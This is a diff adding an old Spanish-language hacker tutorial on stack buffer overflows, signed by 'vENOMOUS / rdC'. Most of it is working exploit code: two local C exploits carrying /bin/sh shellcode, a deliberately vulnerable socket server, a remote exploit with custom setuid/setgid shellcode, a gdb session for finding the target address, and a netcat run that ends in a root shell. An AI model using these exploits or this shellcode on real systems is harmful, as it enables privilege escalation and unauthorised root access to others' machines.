@@ -1,0 +1,407 @@
+Bueno,, este paper pretende explicar un poco los buffer overflows, texto
+en castellano para que entiendan, aparte no podria escribir todo esto
+en ingles asique :)
+
+Veamos..
+
+
+Buffers pequenios[local]:
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Por ejemplo, tenemos un buffer de 120, la RET estara 8 despues,, o sea
+tenemos q escribir hasta 124, y despues mandar nuestra direccion
+que apunta a los nops[0x90] (no-operation) q seguiran hasta nuestro shellcode.
+
+  124      addr(4)        84 nops   strlen(shellcodE)   bytes usados
+[basura][nuestra addr][MUCHOS NOPS][shellc0de]
+   1           2             3          4            explicaciones nros
+
+              |__________^
+              (tenemos q modificar la ret con nuestra dir)
+              (para q caiga en los NOPS o en el COMIENZO justo de el)
+              (shellcode)
+
+1.. llenamos de A's hasta llegar a la ret, o sea, con el ejemplo anterior,
+    seria hasta 124
+
+2.. ponemos nuestra direccion q apuntara a los nops
+
+3.. muchos nops.. pero teniendo en cuenta que estamos sobreescribiendo
+    talvez informacion importante.
+
+4.. el shellcode que ejecutaremos para nuestro adorlable #
+
+
+Buffers grandes[local]:
+~~~~~~~~~~~~~~~~~~~~~~~
+
+		[nops][shellc0de][nuestra direccion]
+                   1       2            3
+
+                 ^___________________|
+
+1.. hacemos un ' XXX - strlen(shellcode)  ' donde XXX seria el buffer +
+    4 (para llegar a la RET), supongamos ahora que el buffer es
+    esta declarado como char buffer[1024]; , ahora tendriamos que
+    escribir hasta 1028, pero como tenemos el shellcode tambien, hacemos 
+    1028 - strlen(shellcode)
+
+2.. ponemos el shellc0de,, y llegamos finalmente a 1028.
+    ej: strlen (shellcode)
+
+3.. ponemos finalmente la direccion modificada para q nos de el rootshell
+    aqui, sobreescribimos la ret con nuestra direccion.
+
+ahora,, los 2 tipos de exploits para los 2 diferentes casos...
+
+CASO I: local [buffer peque#o]
+~~~~~~
+
+/* local 'default' exploit.
+ * by vEN0MOUS of rdC Mon, jul 19, 1999. [20:26:26]                     
+ */
+
+#define VULN "/path/to/the/vulnerable/proggy" // u can erase this
+					      // and put the vuln proggy
+      					      // in the execl
+
+unsigned long getsp (void) 
+{
+	__asm__("mov %esp,%eax");
+}
+
+char shellcodE[] =         /* just aleph1 shellcode */
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+main(int argc, char *argv[0])
+{
+  char bombeta[130];
+
+  int a,
+      offset=0,
+      b,x,y;
+
+  long address;
+
+
+
+	/* si argv[1] es igual a algun numero, lo toma como offset */
+	if (argc > 1) offset = atoi(argv[1]);
+	
+	
+	/* llenamos hasta 124 con A */
+	for ( x = 0 ; x < 124 ; x++)
+	bombeta[x] = 'A';
+
+	address = getsp() + offset;
+	printf("\nUsing address 0x%x\nUsing Offset %d",address,offset);
+	bombeta[x++] = address & 0x000000ff;
+	bombeta[x++] = (address & 0x0000ff00) >> 8;
+	bombeta[x++] = (address & 0x00ff0000) >> 16;
+	bombeta[x++] = (address & 0xff000000) >> 24;
+
+	/* ponemos los nops */
+	for ( ; x < 90 ; x++)
+	bombeta[x] = 0x90;
+
+	/* shellcode... */
+	for (y = 0 ; y < strlen(shellcodE) ; y++, x++)
+	bombeta[x] = shellcodE[y];
+
+	bombeta[x++] = '\0';
+
+	printf("\nif you dont get the root prompt now, change the offset\n");
+
+	execl(VULN,VULN,bombeta, (char *)0);
+}
+
+
+CASO II: local [buffer grande]
+~~~~~~~
+
+/* local 'default' exploit.
+ * by vEN0MOUS of rdC Mon, jul 19, 1999.
+ */
+
+#define VULN "/path/to/the/vulnerable/proggy"
+
+unsigned long getsp (void) 
+{
+	__asm__("mov %esp,%eax");
+}
+
+char shellcodE[] =                   // again aleph1 shellcode
+
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+main(int argc, char *argv[0])
+{
+  char bombeta[1000];
+
+  int a,
+      offset=0,
+      b,x,y;
+
+  long address;
+
+
+        if (argc > 1) offset = atoi(argv[1]);
+
+
+	for ( x = 0 ; x < 1028-strlen(shellcodE) ; x++)
+	bombeta[x] = 0x90;
+
+	for ( y = 0 ; y < strlen(shellcodE) ; x++, y++)
+	bombeta[x] = shellcodE[y];
+
+	address = getsp() + offset;
+        printf("\nUsing address 0x%x\nUsing Offset %d",address,offset);
+        bombeta[x++] = address & 0x000000ff;
+        bombeta[x++] = (address & 0x0000ff00) >> 8;
+        bombeta[x++] = (address & 0x00ff0000) >> 16;
+        bombeta[x++] = (address & 0xff000000) >> 24;
+
+        bombeta[x++] = '\0';
+
+        printf("\nif you dont get the root prompt now, change the offset\n");
+
+        execl(VULN,VULN,bombeta, (char *)0);
+}
+
+
+CASO III: remote [buffer grande]
+~~~~~~~~
+
+No es una gran ciencia el remoto, el unico problema, es que necesitamos
+sacar la direccion, que en el caso del local, lo hace la funcion getsp().
+
+programas: rr.c      [el receptor buggeado]
+           exp-rr.c  [exploit code]
+
+basicamente el rr.c seria el bindshell.c cambiado para que puedas
+escribir una frase... lo lea,,, y haga el strcpy/sprintf/etc..
+
+-- rr.c
+
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
+struct sockaddr_in serv_addr;
+struct sockaddr_in client_addr;
+void makeovr(char ovr[2048]);
+
+int main (int argc, char *argv[])
+{
+        char overflow[2048];
+    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (soc_des == -1)
+        exit(-1);
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serv_addr.sin_port = htons(atoi(argv[1]));
+    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+    if (soc_rc != 0)
+        exit(-1);
+    setpgrp();
+    signal(SIGHUP, SIG_IGN);
+    soc_rc = listen(soc_des, 5);
+    if (soc_rc != 0)
+        exit(0);
+    while (1) {
+        soc_len = sizeof(client_addr);
+        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
+        if (soc_cli < 0)
+            exit(0);
+
+	/* mensaje de bienvenida :) */
+        write(soc_cli,"escribe una frase\n",6);
+	/* lee nuestro input */
+        read(soc_cli,overflow,sizeof(overflow));
+	/* muestra nuestro input en consola (donde se haya corrido el prg */
+        printf("%s\n",overflow);
+	/* pasa el control a el remoto, para q vea el output. */
+        /* sino el root se daria donde se corrio el proggie (consola) */
+        dup2(soc_cli,0);
+        dup2(soc_cli,1);
+        dup2(soc_cli,2);
+	/* pasamos lo recibido a una funcion la cual esta buggeada */
+        makeovr(overflow);
+    close(soc_cli);
+    }
+}
+
+void makeovr(char ovr[2048])
+{
+        char puta[1024];
+
+	/* hemm.. :) */
+        strcpy(puta,ovr);
+}
+--end
+
+-- exp-rr.c
+/* exploit code para el rr.c
+ * venomous/rdC
+ */
+
+char shellcodE[] =
+/* setgid=0 + setreuid=0 + /bin/sh - .c por mi, lo demas hecho c/hellkit :)*/
+"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1"
+"\x70\x80\x36\x01\x46\xe2\xfa\xea\x09\x2e\x63\x68\x6f\x2e\x72\x69"
+"\x01\x80\xed\x66\x2a\x01\x01\x54\x88\xe4\x82\xed\x11\x56\x57\x52"
+"\xe9\x01\x01\x01\x01\x5a\x80\xc2\xc7\x11\x01\x01\xc6\x44\xf9\x01"
+"\x01\x01\x01\xc6\x44\xfd\x01\x01\x01\x01\x8c\xba\x1f\xee\xfe\xfe"
+"\x88\x7c\xf9\xb9\x47\x01\x01\x01\x30\xf7\x30\xc8\x52\x88\xf2\xcc"
+"\x81\xb9\x2f\x01\x01\x01\x52\x88\xf2\xcc\x81\x8c\x44\xf9\x88\xc0"
+"\xb9\x0a\x01\x01\x01\x88\xff\x30\xd3\x52\x88\xf2\xcc\x81\x6b\x01"
+"\xe9\xe7\xff\xfe\xfe\x91\x91";
+
+
+main(int argc, char *argv[0])
+{
+  char bombeta[2048];
+
+  int a,
+      offset=0,
+      b,y,x;
+
+  long address;
+
+
+
+        if (argc > 1) offset = atoi(argv[1]);
+
+
+        for ( x = 0 ; x < 1028-strlen(shellcodE) ; x++)
+        bombeta[x] = 0x90;
+
+        for ( y = 0 ; y < strlen(shellcodE) ; x++, y++)
+        bombeta[x] = shellcodE[y];
+
+        address = 0xbfffee2c + offset; // <--- lo explico mas abajo
+        bombeta[x++] = address & 0x000000ff;
+        bombeta[x++] = (address & 0x0000ff00) >> 8;
+        bombeta[x++] = (address & 0x00ff0000) >> 16;
+        bombeta[x++] = (address & 0xff000000) >> 24;
+
+        bombeta[x++] = '\0';
+	printf("%s\n",bombeta);
+}
+--end
+
+Te estaras preguntando como se saca esa direccion?.. bueno,, ante del
+strcpy.. hace un printf("0x%x\n",getsp()); [*] y veras q es esa direccion,
+tambien podes jugar con esa addr, y saltear a otras partes del programa
+y hacer q se repitan algunas cosas como printf's y demas,, probalo si
+tenes ganas jugar un rato :)
+Tambien podes usar el strace/ltrace q son debuggers para ver la info.
+o bien,, podes usar al amigo gdb :)
+--
+[*] no recuerdas que es getsp(); ?.. mira mas arriba, en los exploits
+locales, sirve para sacar la direccion del momento.
+--
+otra forma de sacar la direccion del buffer, seria algo como
+printf("%p\n",buffer_name); , y sumarle 100 de offset aproximadamente
+para poder caer en los nops.
+--
+O bien, con el gdb seria algo como:...
+
+powerhouse:/c0de# cc -o rr rr.c
+powerhouse:/c0de# cc -o rr -ggdb rr.c
+powerhouse:/c0de# gdb rr
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) break main
+Breakpoint 1 at 0x8048709: file rr.c, line 17.
+(gdb) break makeovr
+Breakpoint 2 at 0x80488cd: file rr.c, line 66.
+(gdb) r 5050
+Starting program: /c0de/rr
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+
+Breakpoint 1, main (argc=1, argv=0xbffffaa4) at rr.c:17
+17          soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+(gdb) c
+Continuing.
+ffdsfdsfdsfd
+ÿ¿@)@@)@Yª
+bleh
+
+Breakpoint 2, makeovr (ovr=0xbffff658
+"ffdsfdsfdsfd\r\nÿ¿@)\001@@)\001@Yª")
+    at rr.c:66
+66              strcpy(puta,ovr);
+(gdb) printf "%p\n", puta
+0xbfffee2c
+(gdb)
+
+---
+
+Se utiliza con el nc [netcat], o bien podrias programar la parte de socks
+para no tener que utilizar este programa :)
+
+powerhouse:/c0de# ./rr 7974 &
+[1] 17358
+powerhouse:/c0de# (./exp-rr 0 ; cat ) | nc localhost 7974
+escribe una frase
+<shellcode>
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+CASO IV: remote [buffer peque#o]
+~~~~~~~~
+
+figure it out .. #)
+
+
+other stuff:
+~~~~~~~~~~~~
+
+/* Este es un shellcode q escribi yo en C y lo pase a hexa con el hellkit.
+ * codesize: 135, setreuid+setgid 0 + /bin/sh
+ * venomous/rdC
+ */
+"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1"
+"\x70\x80\x36\x01\x46\xe2\xfa\xea\x09\x2e\x63\x68\x6f\x2e\x72\x69"
+"\x01\x80\xed\x66\x2a\x01\x01\x54\x88\xe4\x82\xed\x11\x56\x57\x52"
+"\xe9\x01\x01\x01\x01\x5a\x80\xc2\xc7\x11\x01\x01\xc6\x44\xf9\x01"
+"\x01\x01\x01\xc6\x44\xfd\x01\x01\x01\x01\x8c\xba\x1f\xee\xfe\xfe"
+"\x88\x7c\xf9\xb9\x47\x01\x01\x01\x30\xf7\x30\xc8\x52\x88\xf2\xcc"
+"\x81\xb9\x2f\x01\x01\x01\x52\x88\xf2\xcc\x81\x8c\x44\xf9\x88\xc0"
+"\xb9\x0a\x01\x01\x01\x88\xff\x30\xd3\x52\x88\xf2\xcc\x81\x6b\x01"
+"\xe9\xe7\xff\xfe\xfe\x91\x91";
+
+bueno, espero que les haya servido de algo, sinceramente :)
+
+Greets:
+~~~~~~~
+En realidad este sucio paper no deberia tener greets pero.. aqui estan #)
+
+
+greets to ka0z, elbruj0, dn0, Z, masa, #rdC, #flatline
+
+-------
+
+hecho por vENOMOUS / rdC, Mon Jul 19 21:13:34 ART 1999 [local]
+                          Sat Oct 30 17:41:37 ART 1999 [remote]
+			  Sat Jun 24 08:25:33 ART 2000 [update]
+		          Fri Jul 28 10:52:04 ART 2000 [final :)]
+
+- venomous@rdcrew.com.ar / http://www.rdcrew.com.ar
